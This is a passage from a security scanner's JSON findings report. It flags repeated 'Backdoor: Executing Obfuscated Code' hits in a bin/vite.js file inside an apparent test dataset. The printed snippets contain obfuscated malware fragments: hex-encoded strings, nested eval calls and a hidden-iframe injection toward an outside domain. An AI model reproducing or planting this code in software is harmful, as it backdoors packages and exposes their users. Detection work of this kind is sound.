                    "text": "\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\",
                    "rendered": {
                      "text": "\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\",
                      "markdown": "`\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 88,
                  "endLine": 5,
                  "endColumn": 108,
                  "snippet": {
                    "text": "\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32",
                    "rendered": {
                      "text": "\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32",
                      "markdown": "`\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 52,
                  "endLine": 5,
                  "endColumn": 84,
                  "snippet": {
                    "text": "\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x",
                    "rendered": {
                      "text": "\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x",
                      "markdown": "`\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 7435,
                  "endLine": 4,
                  "endColumn": 7863,
                  "snippet": {
                    "text": "\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x",
                    "rendered": {
                      "text": "\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x",
                      "markdown": "`\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 7003,
                  "endLine": 4,
                  "endColumn": 7431,
                  "snippet": {
                    "text": "\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32",
                    "rendered": {
                      "text": "\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32",
                      "markdown": "`\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6571,
                  "endLine": 4,
                  "endColumn": 6999,
                  "snippet": {
                    "text": "\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38",
                    "rendered": {
